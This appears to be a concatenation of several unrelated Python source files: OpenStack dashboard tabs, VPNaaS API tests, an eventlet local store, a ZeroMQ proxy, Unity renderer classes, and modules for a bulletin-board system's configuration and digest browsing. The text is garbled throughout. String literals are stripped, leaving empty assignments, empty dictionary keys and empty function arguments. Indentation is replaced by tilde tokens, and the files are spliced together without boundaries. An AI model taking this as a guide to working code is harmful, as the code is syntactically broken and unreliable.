utf-8 # vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
# \n 
# @author: Abishek Subramanian, Cisco Systems, Inc. \n 
# @author: Sergey Sudakovich,   Cisco Systems, Inc. \n 
\n 
from django . utils . translation import ugettext_lazy as _ # noqa \n 
\n 
from horizon import tabs \n 
\n 
\n 
class NetworkProfileTab ( tabs . Tab ) : \n 
~~~ name = _ ( "Network Profile" ) \n 
slug = "network_profile" \n 
template_name = \n 
\n 
def get_context_data ( self , request ) : \n 
~~~ return None \n 
\n 
\n 
~~ ~~ class PolicyProfileTab ( tabs . Tab ) : \n 
~~~ name = _ ( "Policy Profile" ) \n 
slug = "policy_profile" \n 
template_name = \n 
preload = False \n 
\n 
\n 
~~ class IndexTabs ( tabs . TabGroup ) : \n 
~~~ slug = "indextabs" \n 
tabs = ( NetworkProfileTab , PolicyProfileTab ) \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
# Copyright 2011 OpenStack Foundation. \n 
# All Rights Reserved. \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
\n 
~~ """Greenthread local storage of variables using weak references""" \n 
\n 
import weakref \n 
\n 
from eventlet import corolocal \n 
\n 
\n 
class WeakLocal ( corolocal . local ) : \n 
~~~ def __getattribute__ ( self , attr ) : \n 
~~~ rval = corolocal . local . __getattribute__ ( self , attr ) \n 
if rval : \n 
# NOTE(mikal): this bit is confusing. What is stored is a weak \n 
# reference, not the value itself. We therefore need to lookup \n 
# the weak reference and return the inner value here. \n 
~~~ rval = rval ( ) \n 
~~ return rval \n 
\n 
~~ def __setattr__ ( self , attr , value ) : \n 
~~~ value = weakref . ref ( value ) \n 
return corolocal . local . __setattr__ ( self , attr , value ) \n 
\n 
\n 
# NOTE(mikal): the name "store" should be deprecated in the future \n 
~~ ~~ store = WeakLocal ( ) \n 
\n 
# A "weak" store uses weak references and allows an object to fall out of scope \n 
# when it falls out of scope in the code that uses the thread local storage. A \n 
# "strong" store will hold a reference to the object so that it never falls out \n 
# of scope. \n 
weak_store = WeakLocal ( ) \n 
strong_store = corolocal . local \n 
#!/usr/bin/env python \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
#    Copyright 2011 OpenStack Foundation \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
\n 
import eventlet \n 
eventlet . monkey_patch ( ) \n 
\n 
import contextlib \n 
import sys \n 
\n 
from oslo . config import cfg \n 
\n 
from openstack_dashboard . openstack . common import log as logging \n 
from openstack_dashboard . openstack . common import rpc \n 
from openstack_dashboard . openstack . common . rpc import impl_zmq \n 
\n 
CONF = cfg . CONF \n 
CONF . register_opts ( rpc . rpc_opts ) \n 
CONF . register_opts ( impl_zmq . zmq_opts ) \n 
\n 
\n 
def main ( ) : \n 
~~~ CONF ( sys . argv [ 1 : ] , project = ) \n 
logging . setup ( "oslo" ) \n 
\n 
with contextlib . closing ( impl_zmq . ZmqProxy ( CONF ) ) as reactor : \n 
~~~ reactor . consume_in_thread ( ) \n 
reactor . wait ( ) \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
# Copyright 2013, Mirantis Inc \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
# \n 
# @author: Tatiana Mazur \n 
\n 
~~ ~~ from openstack_dashboard import api \n 
from openstack_dashboard . test import helpers as test \n 
\n 
from neutronclient . v2_0 import client \n 
\n 
neutronclient = client . Client \n 
\n 
\n 
class VPNaasApiTests ( test . APITestCase ) : \n 
~~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_vpnservice_create ( self ) : \n 
~~~ vpnservice1 = self . api_vpnservices . first ( ) \n 
form_data = { \n 
: vpnservice1 [ ] , \n 
: vpnservice1 [ ] , \n 
: vpnservice1 [ ] , \n 
: vpnservice1 [ ] , \n 
: vpnservice1 [ ] \n 
} \n 
\n 
vpnservice = { : self . api_vpnservices . first ( ) } \n 
neutronclient . create_vpnservice ( \n 
{ : form_data } ) . AndReturn ( vpnservice ) \n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . vpnservice_create ( self . request , ** form_data ) \n 
self . assertIsInstance ( ret_val , api . vpn . VPNService ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_vpnservices_get ( self ) : \n 
~~~ vpnservices = { : self . vpnservices . list ( ) } \n 
vpnservices_dict = { : self . api_vpnservices . list ( ) } \n 
\n 
neutronclient . list_vpnservices ( ) . AndReturn ( vpnservices_dict ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . vpnservices_get ( self . request ) \n 
for ( v , d ) in zip ( ret_val , vpnservices [ ] ) : \n 
~~~ self . assertIsInstance ( v , api . vpn . VPNService ) \n 
self . assertTrue ( v . name , d . name ) \n 
self . assertTrue ( v . id ) \n 
\n 
~~ ~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_vpnservice_get ( self ) : \n 
~~~ vpnservice1 = self . api_vpnservices . first ( ) \n 
vpnservice = { : vpnservice1 } \n 
\n 
neutronclient . show_vpnservice ( \n 
vpnservice [ ] [ ] ) . AndReturn ( vpnservice ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . vpnservice_get ( self . request , \n 
vpnservice [ ] [ ] ) \n 
self . assertIsInstance ( ret_val , api . vpn . VPNService ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ikepolicy_create ( self ) : \n 
~~~ ikepolicy1 = self . api_ikepolicies . first ( ) \n 
form_data = { \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] , \n 
: ikepolicy1 [ ] \n 
} \n 
\n 
ikepolicy = { : self . api_ikepolicies . first ( ) } \n 
neutronclient . create_ikepolicy ( \n 
{ : form_data } ) . AndReturn ( ikepolicy ) \n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ikepolicy_create ( self . request , ** form_data ) \n 
self . assertIsInstance ( ret_val , api . vpn . IKEPolicy ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ikepolicies_get ( self ) : \n 
~~~ ikepolicies = { : self . ikepolicies . list ( ) } \n 
ikepolicies_dict = { : self . api_ikepolicies . list ( ) } \n 
\n 
neutronclient . list_ikepolicies ( ) . AndReturn ( ikepolicies_dict ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ikepolicies_get ( self . request ) \n 
for ( v , d ) in zip ( ret_val , ikepolicies [ ] ) : \n 
~~~ self . assertIsInstance ( v , api . vpn . IKEPolicy ) \n 
self . assertTrue ( v . name , d . name ) \n 
self . assertTrue ( v . id ) \n 
\n 
~~ ~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ikepolicy_get ( self ) : \n 
~~~ ikepolicy1 = self . api_ikepolicies . first ( ) \n 
ikepolicy = { : ikepolicy1 } \n 
\n 
neutronclient . show_ikepolicy ( \n 
ikepolicy [ ] [ ] ) . AndReturn ( ikepolicy ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ikepolicy_get ( self . request , \n 
ikepolicy [ ] [ ] ) \n 
self . assertIsInstance ( ret_val , api . vpn . IKEPolicy ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ipsecpolicy_create ( self ) : \n 
~~~ ipsecpolicy1 = self . api_ipsecpolicies . first ( ) \n 
form_data = { \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] , \n 
: ipsecpolicy1 [ ] \n 
} \n 
\n 
ipsecpolicy = { : self . api_ipsecpolicies . first ( ) } \n 
neutronclient . create_ipsecpolicy ( \n 
{ : form_data } ) . AndReturn ( ipsecpolicy ) \n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ipsecpolicy_create ( self . request , ** form_data ) \n 
self . assertIsInstance ( ret_val , api . vpn . IPSecPolicy ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ipsecpolicies_get ( self ) : \n 
~~~ ipsecpolicies = { : self . ipsecpolicies . list ( ) } \n 
ipsecpolicies_dict = { : self . api_ipsecpolicies . list ( ) } \n 
\n 
neutronclient . list_ipsecpolicies ( ) . AndReturn ( ipsecpolicies_dict ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ipsecpolicies_get ( self . request ) \n 
for ( v , d ) in zip ( ret_val , ipsecpolicies [ ] ) : \n 
~~~ self . assertIsInstance ( v , api . vpn . IPSecPolicy ) \n 
self . assertTrue ( v . name , d . name ) \n 
self . assertTrue ( v . id ) \n 
\n 
~~ ~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ipsecpolicy_get ( self ) : \n 
~~~ ipsecpolicy1 = self . api_ipsecpolicies . first ( ) \n 
ipsecpolicy = { : ipsecpolicy1 } \n 
\n 
neutronclient . show_ipsecpolicy ( \n 
ipsecpolicy [ ] [ ] ) . AndReturn ( ipsecpolicy ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ipsecpolicy_get ( self . request , \n 
ipsecpolicy [ ] [ ] ) \n 
self . assertIsInstance ( ret_val , api . vpn . IPSecPolicy ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ipsecsiteconnection_create ( self ) : \n 
~~~ ipsecsiteconnection1 = self . api_ipsecsiteconnections . first ( ) \n 
form_data = { \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] , \n 
: ipsecsiteconnection1 [ ] \n 
} \n 
\n 
ipsecsiteconnection = { : \n 
self . api_ipsecsiteconnections . first ( ) } \n 
neutronclient . create_ipsec_site_connection ( \n 
{ : \n 
form_data } ) . AndReturn ( ipsecsiteconnection ) \n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ipsecsiteconnection_create ( \n 
self . request , ** form_data ) \n 
self . assertIsInstance ( ret_val , api . vpn . IPSecSiteConnection ) \n 
\n 
~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ipsecsiteconnections_get ( self ) : \n 
~~~ ipsecsiteconnections = { \n 
: self . ipsecsiteconnections . list ( ) } \n 
ipsecsiteconnections_dict = { \n 
: self . api_ipsecsiteconnections . list ( ) } \n 
\n 
neutronclient . list_ipsec_site_connections ( ) . AndReturn ( \n 
ipsecsiteconnections_dict ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ipsecsiteconnections_get ( self . request ) \n 
for ( v , d ) in zip ( ret_val , \n 
ipsecsiteconnections [ ] ) : \n 
~~~ self . assertIsInstance ( v , api . vpn . IPSecSiteConnection ) \n 
self . assertTrue ( v . name , d . name ) \n 
self . assertTrue ( v . id ) \n 
\n 
~~ ~~ @ test . create_stubs ( { neutronclient : ( , ) } ) \n 
def test_ipsecsiteconnection_get ( self ) : \n 
~~~ ipsecsiteconnection1 = self . api_ipsecsiteconnections . first ( ) \n 
ipsecsiteconnection = { : ipsecsiteconnection1 } \n 
\n 
neutronclient . show_ipsec_site_connection ( \n 
ipsecsiteconnection [ ] [ ] ) . AndReturn ( \n 
ipsecsiteconnection ) \n 
\n 
self . mox . ReplayAll ( ) \n 
\n 
ret_val = api . vpn . ipsecsiteconnection_get ( self . request , \n 
ipsecsiteconnection [ ] [ ] ) \n 
self . assertIsInstance ( ret_val , api . vpn . IPSecSiteConnection ) \n 
~~ ~~ from horizon import tables \n 
from openstack_dashboard . usage import base \n 
\n 
\n 
class UsageView ( tables . DataTableView ) : \n 
~~~ usage_class = None \n 
show_terminated = True \n 
\n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ super ( UsageView , self ) . __init__ ( * args , ** kwargs ) \n 
if not issubclass ( self . usage_class , base . BaseUsage ) : \n 
~~~ raise AttributeError ( "You must specify a usage_class attribute " \n 
"which is a subclass of BaseUsage." ) \n 
\n 
~~ ~~ def get_template_names ( self ) : \n 
~~~ if self . request . GET . get ( , ) == : \n 
~~~ return "." . join ( ( self . template_name . rsplit ( , 1 ) [ 0 ] , ) ) \n 
~~ return self . template_name \n 
\n 
~~ def get_content_type ( self ) : \n 
~~~ if self . request . GET . get ( , ) == : \n 
~~~ return "text/csv" \n 
~~ return "text/html" \n 
\n 
~~ def get_data ( self ) : \n 
~~~ project_id = self . kwargs . get ( , self . request . user . tenant_id ) \n 
self . usage = self . usage_class ( self . request , project_id ) \n 
self . usage . summarize ( * self . usage . get_date_range ( ) ) \n 
self . usage . get_limits ( ) \n 
self . kwargs [ ] = self . usage \n 
return self . usage . usage_list \n 
\n 
~~ def get_context_data ( self , ** kwargs ) : \n 
~~~ context = super ( UsageView , self ) . get_context_data ( ** kwargs ) \n 
context [ ] . kwargs [ ] = self . usage \n 
context [ ] = self . usage . form \n 
context [ ] = self . usage \n 
return context \n 
\n 
~~ def render_to_response ( self , context , ** response_kwargs ) : \n 
~~~ if self . request . GET . get ( , ) == : \n 
~~~ render_class = self . csv_response_class \n 
response_kwargs . setdefault ( "filename" , "usage.csv" ) \n 
~~ else : \n 
~~~ render_class = self . response_class \n 
~~ resp = render_class ( request = self . request , \n 
template = self . get_template_names ( ) , \n 
context = context , \n 
content_type = self . get_content_type ( ) , \n 
** response_kwargs ) \n 
return resp \n 
~~ ~~ from enum import IntEnum \n 
from . component import Component \n 
from . object import field \n 
\n 
\n 
class ReflectionProbeUsage ( IntEnum ) : \n 
~~~ Off = 0 \n 
BlendProbes = 1 \n 
BlendProbesAndSkybox = 2 \n 
Simple = 3 \n 
\n 
\n 
~~ class ShadowCastingMode ( IntEnum ) : \n 
~~~ Off = 0 \n 
On = 1 \n 
TwoSided = 2 \n 
ShadowsOnly = 3 \n 
\n 
\n 
~~ class Renderer ( Component ) : \n 
~~~ enabled = field ( "m_Enabled" , bool ) \n 
lightmap_index = field ( "m_LightmapIndex" ) \n 
materials = field ( "m_Materials" ) \n 
probe_anchor = field ( "m_ProbeAnchor" ) \n 
receive_shadows = field ( "m_ReceiveShadows" , bool ) \n 
reflection_probe_usage = field ( "m_ReflectionProbeUsage" , ReflectionProbeUsage ) \n 
shadow_casting_mode = field ( "m_CastShadows" , ShadowCastingMode ) \n 
sorting_layer_id = field ( "m_SortingLayerID" ) \n 
sorting_order = field ( "m_SortingOrder" ) \n 
use_light_probes = field ( "m_UseLightProbes" , bool ) \n 
lightmap_index_dynamic = field ( "m_LightmapIndexDynamic" ) \n 
lightmap_tiling_offset = field ( "m_LightmapTilingOffset" ) \n 
lightmap_tiling_offset_dynamic = field ( "m_LightmapTilingOffsetDynamic" ) \n 
static_batch_root = field ( "m_StaticBatchRoot" ) \n 
subset_indices = field ( "m_SubsetIndices" ) \n 
\n 
@ property \n 
def material ( self ) : \n 
~~~ return self . materials [ 0 ] \n 
\n 
\n 
~~ ~~ class ParticleSystemRenderMode ( IntEnum ) : \n 
~~~ Billboard = 0 \n 
Stretch = 1 \n 
HorizontalBillboard = 2 \n 
VerticalBillboard = 3 \n 
Mesh = 4 \n 
\n 
\n 
~~ class ParticleSystemSortMode ( IntEnum ) : \n 
~~~ None_ = 0 \n 
Distance = 1 \n 
OldestInFront = 2 \n 
YoungestInFront = 3 \n 
\n 
\n 
~~ class MeshRenderer ( Component ) : \n 
~~~ pass \n 
\n 
\n 
~~ class ParticleRenderer ( Renderer ) : \n 
~~~ camera_velocity_scale = field ( "m_CameraVelocityScale" ) \n 
length_scale = field ( "m_LengthScale" ) \n 
max_particle_size = field ( "m_MaxParticleSize" ) \n 
velocity_scale = field ( "m_VelocityScale" ) \n 
stretch_particles = field ( "m_StretchParticles" ) \n 
uv_animation = field ( "UV Animation" ) \n 
\n 
\n 
~~ class ParticleSystemRenderer ( Renderer ) : \n 
~~~ camera_velocity_scale = field ( "m_CameraVelocityScale" ) \n 
length_scale = field ( "m_LengthScale" ) \n 
max_particle_size = field ( "m_MaxParticleSize" ) \n 
mesh = field ( "m_Mesh" ) \n 
mesh1 = field ( "m_Mesh1" ) \n 
mesh2 = field ( "m_Mesh2" ) \n 
mesh3 = field ( "m_Mesh3" ) \n 
normal_direction = field ( "m_NormalDirection" ) \n 
render_mode = field ( "m_RenderMode" , ParticleSystemRenderMode ) \n 
sort_mode = field ( "m_SortMode" , ParticleSystemSortMode ) \n 
sorting_fudge = field ( "m_SortingFudge" ) \n 
velocity_scale = field ( "m_VelocityScale" ) \n 
#!/usr/bin/env python \n 
~~ from ConfigParser import * \n 
from StringIO import * \n 
from Log import Log \n 
import datetime \n 
\n 
class Config : \n 
~~~ @ staticmethod \n 
def LoadConfig ( ) : \n 
~~~ Config . parser = ConfigParser ( ) \n 
try : \n 
~~~ sconff = open ( CONFIG_FILE , "r" ) \n 
~~ except : \n 
~~~ Log . warn ( "cannot open config file" ) \n 
return \n 
\n 
~~ sconf = StringIO ( ) \n 
sconf . write ( "[sysconf]\\n" ) \n 
sconf . write ( sconff . read ( ) ) \n 
sconf . seek ( 0 ) \n 
Config . parser . readfp ( sconf ) \n 
sconff . close ( ) \n 
sconf . close ( ) \n 
return \n 
\n 
~~ @ staticmethod \n 
def GetBoardsFile ( ) : \n 
~~~ return BOARDS_FILE \n 
\n 
~~ @ staticmethod \n 
def GetInt ( name , defval ) : \n 
~~~ if ( Config . parser . has_option ( , name ) ) : \n 
~~~ return Config . parser . getint ( , name ) \n 
~~ else : \n 
~~~ return defval \n 
\n 
~~ ~~ @ staticmethod \n 
def GetString ( name , defval ) : \n 
~~~ if ( Config . parser . has_option ( , name ) ) : \n 
~~~ val = Config . parser . get ( , name ) \n 
if ( val [ 0 ] == \'"\' and val . endswith ( \'"\' ) ) : \n 
~~~ val = val [ 1 : - 1 ] \n 
~~ return val . decode ( ) \n 
~~ else : \n 
~~~ return defval \n 
\n 
~~ ~~ ~~ BBS_ROOT = \n 
BBS_XMPP_CERT_FILE = BBS_ROOT + "xmpp.crt" \n 
BBS_XMPP_KEY_FILE = BBS_ROOT + "xmpp.key" \n 
\n 
BOARDS_FILE = BBS_ROOT + \n 
STRLEN = 80 \n 
ARTICLE_TITLE_LEN = 60 \n 
BM_LEN = 60 \n 
MAXBOARD = 400 \n 
CONFIG_FILE = BBS_ROOT + \n 
FILENAME_LEN = 20 \n 
OWNER_LEN = 30 \n 
SESSIONID_LEN = 32 \n 
REFRESH_TOKEN_LEN = 128 \n 
NAMELEN = 40 \n 
IDLEN = 12 \n 
MD5PASSLEN = 16 \n 
OLDPASSLEN = 14 \n 
MOBILE_NUMBER_LEN = 17 \n 
MAXCLUB = 128 \n 
MAXUSERS = 20000 \n 
MAX_MSG_SIZE = 1024 \n 
MAXFRIENDS = 400 \n 
MAXMESSAGE = 5 \n 
MAXSIGLINES = 6 \n 
IPLEN = 16 \n 
DEFAULTBOARD = "sysop" \n 
BLESS_BOARD = "happy_birthday" \n 
QUOTED_LINES = 10 \n 
\n 
MAXACTIVE = 8000 \n 
USHM_SIZE = MAXACTIVE + 10 \n 
UTMP_HASHSIZE = USHM_SIZE * 4 \n 
UCACHE_SEMLOCK = 0 \n 
LEN_FRIEND_EXP = 15 \n 
\n 
REFRESH_TIME = 30 # time between friend list update \n 
USER_TITLE_LEN = 18 # used in UCache \n 
SESSION_TIMEOUT = datetime . timedelta ( 30 ) \n 
SESSION_TIMEOUT_SECONDS = 86400 * 30 \n 
\n 
XMPP_IDLE_TIME = 300 \n 
XMPP_LONG_IDLE_TIME = 1800 \n 
\n 
XMPP_UPDATE_TIME_INTERVAL = 10 \n 
XMPP_PING_TIME_INTERVAL = 60 \n 
\n 
PUBLIC_SHMKEY = 3700 \n 
MAX_ATTACHSIZE = 20 * 1024 * 1024 \n 
\n 
BMDEL_DECREASE = True \n 
SYSMAIL_BOARD = "sysmail" \n 
ADD_EDITMARK = True \n 
SEARCH_COUNT_LIMIT = 20 \n 
\n 
MAIL_SIZE_LIMIT = - 1 \n 
\n 
SEC_DELETED_OLDHOME = 3600 * 24 * 3 \n 
SELF_INTRO_MAX_LEN = 800 \n 
import re \n 
import os \n 
import stat \n 
import json \n 
import struct \n 
import time \n 
import Config \n 
import Board \n 
import Post \n 
import BoardManager \n 
from Util import Util \n 
from Log import Log \n 
from errors import * \n 
\n 
DEFAULT_DIGEST_LIST_COUNT = 20 \n 
\n 
class DigestItem : \n 
~~~ def __init__ ( self , basepath ) : \n 
~~~ self . basepath = basepath \n 
self . title = \n 
self . host = \n 
self . port = 0 \n 
self . attachpos = 0 \n 
self . fname = \n 
self . mtitle = \n 
self . items = [ ] \n 
self . update_time = 0 \n 
\n 
self . id = 0 \n 
self . sysop_only = 0 \n 
self . bms_only = 0 \n 
self . zixia_only = 0 \n 
\n 
~~ def IsDir ( self ) : \n 
~~~ try : \n 
~~~ st = os . stat ( self . realpath ( ) ) \n 
return stat . S_ISDIR ( st . st_mode ) \n 
~~ except : \n 
~~~ return False \n 
\n 
~~ ~~ def IsFile ( self ) : \n 
~~~ try : \n 
~~~ st = os . stat ( self . realpath ( ) ) \n 
return stat . S_ISREG ( st . st_mode ) \n 
~~ except : \n 
~~~ return False \n 
\n 
~~ ~~ def GetModTime ( self ) : \n 
~~~ try : \n 
~~~ st = os . stat ( self . realpath ( ) ) \n 
mtime = st . st_mtime \n 
~~ except : \n 
~~~ mtime = time . time ( ) \n 
~~ return mtime \n 
\n 
~~ def names_path ( self ) : \n 
~~~ return "%s/.Names" % self . realpath ( ) \n 
\n 
~~ def realpath ( self ) : \n 
~~~ return "%s/%s" % ( Config . BBS_ROOT , self . path ( ) ) \n 
\n 
~~ def path ( self ) : \n 
~~~ if ( self . fname ) : \n 
~~~ return "%s/%s" % ( self . basepath , self . fname ) \n 
~~ else : \n 
~~~ return self . basepath \n 
\n 
~~ ~~ def CheckUpdate ( self ) : \n 
~~~ try : \n 
~~~ stat = os . stat ( self . names_path ( ) ) \n 
if ( stat . st_mtime > self . update_time ) : \n 
~~~ self . LoadNames ( ) \n 
~~ ~~ except : \n 
\n 
# so we should update the upper layer... \n 
~~~ return False \n 
\n 
~~ return True \n 
\n 
~~ def LoadNames ( self ) : \n 
~~~ try : \n 
~~~ f = open ( self . names_path ( ) , "r" ) \n 
~~ except IOError : \n 
~~~ return 0 \n 
\n 
~~ stat = os . fstat ( f . fileno ( ) ) \n 
self . update_time = stat . st_mtime \n 
\n 
item = DigestItem ( self . path ( ) ) \n 
\n 
hostname = \n 
_id = 0 \n 
bms_only = 0 \n 
sysop_only = 0 \n 
zixia_only = 0 \n 
while ( True ) : \n 
~~~ line = f . readline ( ) \n 
if ( line == "" ) : break \n 
npos = line . find ( "\\n" ) \n 
if ( npos != - 1 ) : line = line [ : npos ] \n 
\n 
if ( line [ : 1 ] == ) : \n 
~~~ if ( line [ : 8 ] == "# Title=" ) : \n 
~~~ if ( not self . mtitle ) : \n 
~~~ self . mtitle = line [ 8 : ] \n 
~~ ~~ ~~ result = re . match ( , line ) \n 
if ( result ) : \n 
~~~ key = result . group ( 1 ) \n 
value = result . group ( 2 ) \n 
if ( key == "Name" ) : \n 
~~~ item . title = value \n 
item . attachpos = 0 \n 
~~ elif ( key == "Path" ) : \n 
~~~ if ( value [ : 2 ] == "~/" ) : \n 
~~~ item . fname = value [ 2 : ] \n 
~~ else : \n 
~~~ item . fname = value \n 
~~ if ( item . fname . find ( ".." ) != - 1 ) : \n 
~~~ continue \n 
~~ if ( item . title . find ( "(BM: BMS)" ) != - 1 ) : \n 
~~~ bms_only += 1 \n 
~~ elif ( item . title . find ( "(BM: SYSOPS)" ) != - 1 ) : \n 
~~~ sysop_only += 1 \n 
~~ elif ( item . title . find ( "(BM: ZIXIAs)" ) != - 1 ) : \n 
~~~ zixia_only += 1 \n 
~~ if ( item . fname . find ( "!@#$%" ) != - 1 ) : \n 
~~~ parts = re . split ( , item . fname ) \n 
newparts = [ ] \n 
for part in parts : \n 
~~~ if ( part ) : \n 
~~~ newparts += [ part ] \n 
~~ ~~ hostname = newparts [ 0 ] \n 
item . fname = newparts [ 1 ] \n 
try : \n 
~~~ item . port = int ( newparts [ 2 ] ) \n 
~~ except : \n 
~~~ item . port = 0 \n 
~~ ~~ item . id = _id \n 
_id += 1 \n 
item . bms_only = bms_only \n 
item . sysop_only = sysop_only \n 
item . zixia_only = zixia_only \n 
item . host = hostname \n 
self . items += [ item ] \n 
item = DigestItem ( self . path ( ) ) \n 
hostname = \n 
~~ elif ( key == "Host" ) : \n 
~~~ hostname = value \n 
~~ elif ( key == "Port" ) : \n 
~~~ try : \n 
~~~ item . port = int ( value ) \n 
~~ except : \n 
~~~ item . port = 0 \n 
~~ ~~ elif ( key == "Attach" ) : \n 
~~~ try : \n 
~~~ item . attachpos = int ( value ) \n 
~~ except : \n 
~~~ item . attachpos = 0 \n 
\n 
~~ ~~ ~~ ~~ f . close ( ) \n 
return 1 \n 
\n 
~~ def GetItem ( self , user , route , has_perm = False , need_perm = False ) : \n 
~~~ self . CheckUpdate ( ) \n 
\n 
# for normal items, permission does not matter \n 
if ( self . mtitle . find ( "(BM:" ) != - 1 ) : \n 
~~~ if ( Board . Board . IsBM ( user , self . mtitle [ 4 : ] , ) or user . IsSysop ( ) ) : \n 
~~~ has_perm = True \n 
~~ elif ( need_perm and not has_perm ) : \n 
~~~ return None \n 
~~ ~~ if ( self . mtitle . find ( "(BM: BMS)" ) != - 1 \n 
or self . mtitle . find ( "(BM: SECRET)" ) != - 1 \n 
or self . mtitle . find ( "(BM: SYSOPS)" ) != - 1 ) : \n 
~~~ need_perm = True # take effect at next level... \n 
\n 
~~ if ( len ( route ) == 0 ) : \n 
~~~ return self \n 
~~ target = route [ 0 ] - 1 \n 
_id = target \n 
if ( _id >= len ( self . items ) ) : \n 
~~~ return None \n 
~~ while ( self . items [ _id ] . EffectiveId ( user ) < target ) : \n 
~~~ _id += 1 \n 
if ( _id >= len ( self . items ) ) : \n 
~~~ return None \n 
~~ ~~ item = self . items [ _id ] \n 
# what the .... \n 
item . mtitle = item . title \n 
if ( len ( route ) == 1 ) : \n 
# last level... \n 
~~~ return item \n 
~~ else : \n 
~~~ if ( item . IsDir ( ) ) : \n 
~~~ if ( not item . CheckUpdate ( ) ) : \n 
~~~ return None \n 
~~ return item . GetItem ( user , route [ 1 : ] , has_perm , need_perm ) \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ ~~ def GetRange ( self , user , route , start , end , has_perm = False , need_perm = False ) : \n 
~~~ self . CheckUpdate ( ) \n 
\n 
# only for permission check \n 
firstitem = self . GetItem ( user , route + [ start ] , has_perm , need_perm ) \n 
if ( not firstitem ) : \n 
~~~ return [ ] \n 
# range? disabled for partial result \n 
#lastitem = self.GetItem(user, route + [end], has_perm, need_perm) \n 
#if (not lastitem): \n 
#    return None \n 
\n 
~~ parent = self . GetItem ( user , route , has_perm , need_perm ) \n 
if ( not parent ) : \n 
~~~ return [ ] \n 
~~ if ( not parent . IsDir ( ) ) : \n 
~~~ return [ ] \n 
\n 
~~ result = [ ] \n 
_id = start - 1 \n 
for i in range ( start , end + 1 ) : \n 
~~~ target = i - 1 \n 
